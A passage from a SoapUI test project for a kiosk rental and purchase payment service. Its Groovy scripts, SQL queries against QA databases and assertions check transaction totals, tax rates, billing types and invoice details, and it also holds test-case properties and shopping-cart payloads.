</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Save Authorize Response" id="8f47c8f8-7d38-4bd9-a2d6-cef69dcf446b" disabled="true"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def encodedBody = testRunner.testCase.getTestStepByName('Authorize (Request)').getPropertyValue('Response');
//log.info(encodedBody);
def decodedBody = URLDecoder.decode(encodedBody);
log.info("AuthResponse:$decodedBody");
def list = new JsonSlurper().parseText( decodedBody );
def TransactionID = list.get('ReferenceNumber');
log.info('Transaction_ID = ' + list.get('ReferenceNumber'))
testRunner.testCase.setPropertyValue("TransactionID",list.get('ReferenceNumber').toString());

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

def getInvoiceDetails = sql.firstRow("Select max(OID) AS ID from Invoice Where ReferenceNumber = '$TransactionID'");
def InvoiceId = getInvoiceDetails.ID;
testRunner.testCase.setPropertyValue("InvoiceID",InvoiceId.toString());</script></con:config></con:testStep><con:testStep type="jdbc" name="Check Transaction" id="62fcd229-b7c6-48d6-9bc1-00c8c36def9a" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT 
	transaction_id,
	kioskclient_id,
	promotioncode,
	promotionvalue,
	transaction_status,
	rent_date,
	approvalcode,
	invoiceid,
	amount,
	isoffline,
	rentaltype,
	authamount,
	subtotal,
	discountedsubtotal,
	salestaxamount,
	grandtotal,
	billingtypeid,
	rentaltaxrate,
	purchasetaxrate,
	rentaltaxamount,
	purchasetaxamount,
	shoppingcarttype,
	optintypeID,
	cpCustomerNumber
FROM
	[Transaction](nolock)
WHERE 
	transaction_id = :TnxId
</con:query><con:storedProcedure>false</con:storedProcedure><con:assertion type="Simple Contains" name="Contains ApprovalCode" id="b6c88e9c-d6aa-482f-a3cf-28de7d50e88c"><con:configuration><token>Approved</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check BillingType" id="3d102727-0107-496f-9f31-2aec87ad4ec2"><con:configuration><scriptText>//import groovy.json.JsonSlurper

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
int actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]").toInteger();

def numrentals = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
//Added if and else logic for PRM and PRG functionality.
if (numrentals > 0 &amp;&amp; numpurchases > 0)
{
	assert actualBillingTypeID == 6; //Because of PRM and PRG functionality.
}
else
{
	assert actualBillingTypeID == 7;
}

/* DISABLED THE ASSERTION BASED ON COLLECTION METHOD
else
{
	// if collection method is 1 or 2, billing type 6, collection method 4 or 6 = billing type 7
	if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 1)
		assert actualValue == 6
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 2)
		assert actualValue == 6
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 4)
		assert actualValue == 7
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 6)
		assert actualValue == 7
	else
		assert 0 == 1
}
 */</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check Amounts" id="62dae791-ac46-4245-b0bd-42288e2bb164"><con:configuration><scriptText>import java.text.DecimalFormat;
Round4 = new DecimalFormat("#.####");

//Get Rental Count
def numRentals = context.expand( '${#TestCase#RentalCount}' ).toBigDecimal();
def numPurchases = context.expand( '${#TestCase#PurchaseCount}' ).toBigDecimal();
def HasPhysicalPurchase = context.expand( '${#TestCase#HasPhysicalPurchase}' );

//Get the actual values from JDBC response
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualRentalTaxAmount = holder.getNodeValue("//RENTALTAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPurchaseTaxAmount = holder.getNodeValue("//PURCHASETAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualRentalTaxRate = holder.getNodeValue("//RENTALTAXRATE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPurchaseTaxRate = holder.getNodeValue("//PURCHASETAXRATE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualGrandTotal = holder.getNodeValue("//GRANDTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualDiscountedSubTotal = holder.getNodeValue("//DISCOUNTEDSUBTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualSubTotal = holder.getNodeValue("//SUBTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualAuthAmount = holder.getNodeValue("//AUTHAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPromotionValue = holder.getNodeValue("//PROMOTIONVALUE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualSalesTaxAmount = holder.getNodeValue("//SALESTAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualShoppingCartType = holder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();
def actualRentalType = holder.getNodeValue("//RENTALTYPE[1]").toInteger();
def actualIsOffline = holder.getNodeValue("//ISOFFLINE[1]").toInteger();

//Get the expected values from TestCase properties; calculated in "Encoded Message Body (Authorize)"
def expectedRentalTaxAmount = context.expand( '${#TestCase#RentalTaxAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPurchaseTaxAmount = context.expand( '${#TestCase#PurchaseTaxAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedRentalTaxRate = context.expand( '${#TestCase#RentalTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPurchaseTaxRate = context.expand( '${#TestCase#PurchaseTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedDigitalPurchaseTaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedGrandTotal = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedDiscountedSubTotal = context.expand( '${#TestCase#DiscountedSubTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedSubTotal = context.expand( '${#TestCase#SubTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPromotionValue = context.expand( '${#TestCase#PromoValue}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedSalesTaxAmount = (expectedRentalTaxAmount + expectedPurchaseTaxAmount).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);

//Validations
// rental type is 1 if online and 2 if offline (3 is web)
assert (actualRentalType == 1);
assert (actualIsOffline == 0);
assert (actualDiscountedSubTotal == expectedDiscountedSubTotal);
assert (actualGrandTotal == expectedGrandTotal);
assert (actualSubTotal == expectedSubTotal);
assert (actualAuthAmount == expectedGrandTotal);
assert (actualPromotionValue == expectedPromotionValue);
assert (actualSalesTaxAmount == expectedSalesTaxAmount);
//amounts will be 0 if there were none of that type
if (numRentals == 0) 
{
	assert actualRentalTaxAmount.toBigDecimal() == 0;
	assert actualRentalTaxRate == 0;
} 
else 
{
	assert actualRentalTaxAmount.toBigDecimal() == expectedRentalTaxAmount.toBigDecimal();
	assert actualRentalTaxRate == expectedRentalTaxRate;	
}
//amounts will be 0 if there were none of that type
if (numPurchases == 0) 
{
	assert actualPurchaseTaxAmount.toBigDecimal() == 0;
	assert actualPurchaseTaxRate == 0;
} 
else 
{
	assert actualPurchaseTaxAmount.toBigDecimal() == expectedPurchaseTaxAmount.toBigDecimal();
	if (HasPhysicalPurchase == 'true')
	{
		assert actualPurchaseTaxRate == expectedPurchaseTaxRate;
	}
	else
	{
		assert actualPurchaseTaxRate == expectedDigitalPurchaseTaxRate;
	}
	
}
// 1 = only rentals, 2 = only purchases, 3 = both
if (numRentals > 0 &amp;&amp; numPurchases == 0)
	assert actualShoppingCartType == 1
else if (numRentals == 0 &amp;&amp; numPurchases > 0)
	assert actualShoppingCartType == 2
else
	assert actualShoppingCartType == 3
	</scriptText></con:configuration></con:assertion><con:assertion type="XPath Match" id="6d8ac62a-fe7e-4618-977f-63861f2c2f20" name="Match content of [TRANSACTION_STATUS]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="d1b45fee-cd43-4f09-b272-367adbe8f895" name="Match content of [KIOSKCLIENT_ID]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/KIOSKCLIENT_ID[1]/text()</path><content>${#TestCase#KioskId}</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:properties><con:property><con:name>TnxId</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check AmountBase" id="03c32f1b-9716-47ae-8897-9a1c7f95a7cf" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT 
	sum(amountbase) as totalAmountBase
FROM
	[InvoiceItem]
WHERE 
	Invoice = :InvoiceID
AND
	label = 1</con:query><con:assertion type="GroovyScriptAssertion" id="859a2ef5-91d6-4cb1-aecf-9b4c52dd67ec" name="Script Assertion"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def holder = groovyUtils.getXmlHolder( "Check AmountBase#ResponseAsXml");
def actualAmountBase = holder.getNodeValue("//TOTALAMOUNTBASE[1]").toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
def expectedAmountBase = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);

assert (actualAmountBase == expectedAmountBase);</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Invoice Details" id="10d7a123-6396-44d6-93ce-f22dd2f27b70" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT TOP 1
	i.[Status], 
	i.[System], 
	i.CreatedBy, 
	i.StoreNumber,
	i.CollectionMethod,
	ii.[Status]
FROM
	[Invoice] i (nolock)
INNER JOIN [InvoiceItem] ii ON i.OID = ii.Invoice
WHERE 
	i.OID = :InvoiceID</con:query><con:assertion type="XPath Match" id="240a02f9-cf29-49b8-bec1-b5f1e1e60717" name="Invoice Status"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[1]/text()</path><content>0</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="efcc78e9-3208-4611-b3d8-4fbdcd0ddd89" name="Match content of [SYSTEM]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/SYSTEM[1]/text()</path><content>Rental Systems</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="96905afe-9a46-4b0b-9840-dfdfb72b774e" name="Match content of [CREATEDBY]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/CREATEDBY[1]/text()</path><content>RB\KioskSvc_01_U</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="3c2f7519-7ffa-408a-b2e2-fd6ce8cd05da" name="InvoiceItem Status"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[2]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="4207b007-8259-4190-b87f-c52ed3829198" name="Script Assertion"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualCollectionMethod = invholder.getNodeValue("//COLLECTIONMETHOD[1]").toInteger();

//Get the shopping cart type value from Get Transaction test step.
def tnxHolder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def shoppingCartType = tnxHolder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();

//based on config in QADB100.RedboxServerDB.dbo.KioskBillingConfig table
if (shoppingCartType == 3)
{
	assert actualCollectionMethod == 3;
}
else
{
	assert actualCollectionMethod == 6;
}
</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="Auth Completed" id="7b91a9a3-f7e2-43e2-ae49-eacab46a23ea" disabled="true"><con:settings/><con:config><script/></con:config></con:testStep><con:testStep type="groovy" name="Groovy Script" id="4514d691-f609-4e31-a242-bca102aaa2a2" disabled="true"><con:settings/><con:config><script>def RentalTitleIds = Eval.me("[" + context.expand( '${#TestCase#RentalTitleIds}' ) + "]").min();
log.info RentalTitleIds</script></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Auth");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Auth");</con:setupScript><con:tearDownScript><![CDATA[//if results file global property is populated,  
//record the testcase name with id
//add mingle card link if mingle property is set

def file = new File(context.expand( '${ResultsFile}' ))
if (context.expand( '${ResultsFile}' ) != null && file.exists()) {
file.append(testRunner.testCase.name + "</td><td><a href=\"http://mingle:8080/projects/server_platform/cards/" + 
context.expand('${#TestCase#Mingle}') + "\">" +context.expand('${#TestCase#Mingle}') +
"</a></td><td>" + context.expand('${#TestCase#Id}') + '\r\n')
} 
]]></con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value/></con:property><con:property><con:name>InvoiceID</con:name><con:value/></con:property><con:property><con:name>CCNumber</con:name><con:value>4847354422892240</con:value></con:property><con:property><con:name>CCType</con:name><con:value>5</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>90855364928109</con:value></con:property><con:property><con:name>DigitalpurchaseTaxAmt</con:name><con:value>0</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.8800</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.9990</con:value></con:property><con:property><con:name>UseCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>Email</con:name><con:value>rental.automation@gmail.com</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>PurchaseFormats</con:name><con:value/></con:property><con:property><con:name>numOfPurchases</con:name><con:value/></con:property><con:property><con:name>RentalFormats</con:name><con:value>12,19</con:value></con:property><con:property><con:name>numOfRentals</con:name><con:value>1,1</con:value></con:property><con:property><con:name>PromoCode</con:name><con:value>null</con:value></con:property><con:property><con:name>PromoValue</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseBarcodes</con:name><con:value>000150511</con:value></con:property><con:property><con:name>PurchaseProductFamily</con:name><con:value>Movies</con:value></con:property><con:property><con:name>PurchaseProductType</con:name><con:value>Blu-ray</con:value></con:property><con:property><con:name>PurchaseDiscPrice</con:name><con:value>8</con:value></con:property><con:property><con:name>purchasePayload</con:name><con:value>{"GroupType" : "Purchase",  "Items" : [{"ProductId" : 1943,"ProductFamily" : "Movies","ProductType" : "Blu-ray","MultiDisc" : false,"Pricing" : {"Purchase" : 8,"Expiration" : 8,"PriceSetId" : 1,"ProductPriceId" : 1}}],"Totals" : { "TaxRate" : 8.8800, "Subtotal" : 8,"DiscountedSubtotal" : 8,"TaxAmount" : 0.7104,"GrandTotal" : 8.7104 } }</con:value></con:property><con:property><con:name>RentalCount</con:name><con:value>2</con:value></con:property><con:property><con:name>RentalBarcodes</con:name><con:value>000150561,001505903</con:value></con:property><con:property><con:name>RentalProductFamily</con:name><con:value>Games,Movies</con:value></con:property><con:property><con:name>RentalProductType</con:name><con:value>Xbox One,4K UHD</con:value></con:property><con:property><con:name>RentalDiscPrice</con:name><con:value>3.00,3.00</con:value></con:property><con:property><con:name>RentalNonReturnPrice</con:name><con:value>66.00,66.00</con:value></con:property><con:property><con:name>RentalNonReturnDays</con:name><con:value>22,22</con:value></con:property><con:property><con:name>rentalPayload</con:name><con:value>{"GroupType" : "Rental",  "Items" : [{"ProductId" : 8923,"ProductFamily" : "Games","ProductType" : "Xbox One","MultiDisc" : false,"Pricing" : {"InitialNight" : 3.00,"ExtraNight" : 3.00,"NonReturn" : 66.00,"Expiration" : 3.00,"NonReturnDays" : 22,"PriceSetId" : 1,"ProductPriceId" : 1,"InitialDays" : 1,"DefaultInitialNight" : 3.00,"DefaultExtraNight" : 3.00}},{"ProductId" : 902081,"ProductFamily" : "Movies","ProductType" : "4K UHD","MultiDisc" : false,"Pricing" : {"InitialNight" : 3.00,"ExtraNight" : 3.00,"NonReturn" : 66.00,"Expiration" : 3.00,"NonReturnDays" : 22,"PriceSetId" : 1,"ProductPriceId" : 1,"InitialDays" : 1,"DefaultInitialNight" : 3.00,"DefaultExtraNight" : 3.00}}],"Totals" : { "TaxRate" : 9.9990,"Subtotal" : 6 ,"DiscountedSubtotal" : 6,"TaxAmount" : 0.6,"GrandTotal" : 6.6} }</con:value></con:property><con:property><con:name>SetDaysBack</con:name><con:value>0</con:value></con:property><con:property><con:name>RentalTaxAmount</con:name><con:value>0.6</con:value></con:property><con:property><con:name>PurchaseTaxAmount</con:name><con:value>0</con:value></con:property><con:property><con:name>TransactionTotal</con:name><con:value>6.60</con:value></con:property><con:property><con:name>DiscountedSubTotal</con:name><con:value>6</con:value></con:property><con:property><con:name>SubTotal</con:name><con:value>6</con:value></con:property><con:property><con:name>IsOffline</con:name><con:value>false</con:value></con:property><con:property><con:name>HasPhysicalPurchase</con:name><con:value>false</con:value></con:property><con:property><con:name>RentalTitleIds</con:name><con:value>8923,902081</con:value></con:property><con:property><con:name>PurchaseTitleIds</con:name><con:value>1943</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageId%22%3A+%2294764ae6-2272-43e8-a8b1-cef8303fba94%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22MessageType%22%3A+%22EstimateRedemption%22%2C%22CustomerProfileNumber%22%3A+%2290855364928109%22%2C%22ShoppingCart%22%3A+%7B+%22Groups%22%3A+%5B++%7B%22GroupType%22+%3A+%22Rental%22%2C++%22Items%22+%3A+%5B%7B%22ProductId%22+%3A+8923%2C%22ProductFamily%22+%3A+%22Games%22%2C%22ProductType%22+%3A+%22Xbox+One%22%2C%22MultiDisc%22+%3A+false%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+3.00%2C%22ExtraNight%22+%3A+3.00%2C%22NonReturn%22+%3A+66.00%2C%22Expiration%22+%3A+3.00%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+1%2C%22ProductPriceId%22+%3A+1%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+3.00%2C%22DefaultExtraNight%22+%3A+3.00%7D%7D%2C%7B%22ProductId%22+%3A+902081%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%224K+UHD%22%2C%22MultiDisc%22+%3A+false%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+3.00%2C%22ExtraNight%22+%3A+3.00%2C%22NonReturn%22+%3A+66.00%2C%22Expiration%22+%3A+3.00%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+1%2C%22ProductPriceId%22+%3A+1%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+3.00%2C%22DefaultExtraNight%22+%3A+3.00%7D%7D%5D%2C%22Totals%22+%3A+%7B+%22TaxRate%22+%3A+9.9990%2C%22Subtotal%22+%3A+6+%2C%22DiscountedSubtotal%22+%3A+6%2C%22TaxAmount%22+%3A+0.6%2C%22GrandTotal%22+%3A+6.6%7D+%7D%5D%2C%22Discounts%22%3A+%5B%5D%7D%7D+</con:value></con:property><con:property><con:name>LoyaltyFlag</con:name><con:value/></con:property><con:property><con:name>LoyaltyProductPrice</con:name><con:value/></con:property><con:property><con:name>LoyaltyProductId</con:name><con:value/></con:property><con:property><con:name>DiscountTitleIds</con:name><con:value>8923,902081</con:value></con:property><con:property><con:name>DiscountProductPrices</con:name><con:value>3.00,3.00</con:value></con:property><con:property><con:name>NonLoyaltyProductId</con:name><con:value>8923,902081</con:value></con:property><con:property><con:name>NonLoyaltyProductPrice</con:name><con:value>3.00,3.00</con:value></con:property><con:property><con:name>HasLoyaltyDiscount</con:name><con:value>0</con:value></con:property><con:property><con:name>HasPromoDiscount</con:name><con:value>0</con:value></con:property><con:property><con:name>ERMessageId</con:name><con:value>94764ae6-2272-43e8-a8b1-cef8303fba94</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>cf2a43da-fb68-4f28-b647-cabab658b5fb</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c7ac4c10-ab96-4e99-b1ae-b373224e8115</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>86b29e8b-9449-4b42-a501-717ac5b2bccc</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>aee6dc73-e1a0-4123-aabd-fcd972f9608d</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="BuildShoppingCart" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" id="916556db-2788-452a-b445-5a75f9df4592"><con:description/><con:settings/><con:testStep type="jdbc" name="Warmup Script" id="d25711c3-894a-4f90-8f32-f725776a45de"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() As CurrentDate</con:query><con:assertion type="JDBC Status" id="5897a997-f0a8-4714-b2ed-24087b99e9b6" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="groovy" name="BuildRequest" id="e9df96ea-e6e2-4f45-8a93-18736db27fd2"><con:settings/><con:config><script><![CDATA[//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
Round16 = new DecimalFormat("#.################"); //Rounding the amount to 16 decimals.
Round2 = new DecimalFormat("#.##"); //Rounding the amount to 2 decimals.
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get CreditCard Info
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
def KeyID = encryptCC.getPropertyValue("KeyID");
def CardID = encryptCC.getPropertyValue("CardID");
def EncryptedNumber = encryptCC.getPropertyValue("EncryptedNumber");
def EncryptedTrack2 = encryptCC.getPropertyValue("EncryptedTrack2");
def lastFour = encryptCC.getPropertyValue("CardNumber").reverse().take(4).reverse();
def CardType = encryptCC.getPropertyValue("CardType");
//log.info ("KeyID:$KeyID; CardID:$CardID; EncryptedNumber:$EncryptedNumber; EncryptedTrack2:$EncryptedTrack2");

//Get hard coded disc prices and non-return days
def dvdPrice = context.expand( '${#TestSuite#DVDPrice}' );
def blurayPrice = context.expand( '${#TestSuite#BlurayPrice}' );
def gamePrice = context.expand( '${#TestSuite#GamePrice}' );
def dvdNonReturnDays = context.expand( '${#TestSuite#DVDNonReturnDays}' );
def blurayNonReturnDays = context.expand( '${#TestSuite#BlurayNonReturnDays}' );
def gameNonReturnDays = context.expand( '${#TestSuite#GameNonReturnDays}' );
def purchasePrice = context.expand( '${#TestSuite#PurchasePrice}' );
def digitalCodePrice = context.expand( '${#TestSuite#DigitalCodePrice}' );
def KioskId= context.expand( '${#TestCase#KioskId}' )

//Calculate Nonreturn price
def dvdNonreturnPrice = (dvdPrice.toBigDecimal() * dvdNonReturnDays.toBigDecimal());
def blurayNonreturnPrice = (blurayPrice.toBigDecimal() * blurayNonReturnDays.toBigDecimal());
def gameNonreturnPrice = (gamePrice.toBigDecimal() * gameNonReturnDays.toBigDecimal());
log.info ("dvdNonreturnPrice: $dvdNonreturnPrice; blurayNonreturnPrice: $blurayNonreturnPrice; gameNonreturnPrice: $gameNonreturnPrice");

//Get Disc Info
def getDisctc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["GetDiscs"];

//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j<getDisctc.getPropertyCount();j++)
{
   getDisctc.getPropertyAt(j).setValue("");
}
//BUILD THE RENTAL and PURCHASE PAYLOAD:
//Grab the barcodes, and product types; build the lists. 
rentalBarcodes = [];
purchaseBarcodes = [];
rentalProductFamily = [];
purchaseProductFamily = [];
rentalProductType = [];
purchaseProductType = [];
rentalDiscPrice = [];
purchaseDiscPrice = [];
rentalNonReturnPrice = [];
rentalNonReturnDays = [];
loyaltyProductId = [];
loyaltyProductPrice = [];
promoProductId = [];
promoProductPrice = [];
nonLoyaltyProductId = [];
nonLoyaltyProductPrice = [];

//NEW
rentalTitleIds = []; //will have both rental and purchase titleIds.
purchaseTitleIds = [];

//Payload building and Amount Calculations
//Rental Items Payload
rentalPayload = "{\"GroupType\" : \"Rental\",  \"Items\" : [";
BigDecimal rentalTotal = 0;
//Purchase Items Payload
purchasePayload = "{\"GroupType\" : \"Purchase\",  \"Items\" : [";
BigDecimal purchaseTotal = 0;
BigDecimal digitalTotal = 0;
int rentalCount = 0;
int purchaseCount = 0;
BigDecimal SubTotal = 0;
BigDecimal DiscountedSubTotal = 0;
